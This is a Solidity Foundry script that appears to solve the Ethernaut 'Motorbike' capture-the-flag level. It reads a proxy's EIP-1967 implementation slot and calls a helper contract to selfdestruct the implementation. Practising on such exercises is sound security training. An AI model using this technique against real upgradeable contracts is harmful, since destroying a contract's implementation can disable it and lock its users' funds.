// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import { IMotorbike } from "./IMotorbike.sol";
import { MotorbikeSolution } from "./MotorbikeSolution.sol";

contract MotorbikeScript is Script {

    IMotorbike motorbike;
    address instanceAddress = 0xbb54c6987a695C75DD6Cd01C0F194f202EDA80B0;


    function setUp() public {
        motorbike = IMotorbike(instanceAddress);
    }

    function run() public {
        vm.startBroadcast();
        MotorbikeSolution motorbikeSolution = new MotorbikeSolution();
        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address implementation = address(uint160(uint256(vm.load(instanceAddress, implementationSlot))));

        assert(implementation != address(0));
        assert(isContract(implementation));

        // Unfortunately you can't test the effect of a selfdestruct in foundry currently
        // See: https://github.com/foundry-rs/foundry/issues/1543
        motorbikeSolution.killIt(IMotorbike(implementation));
        vm.stopBroadcast();
    }

    function isContract(address addr) internal returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }


}
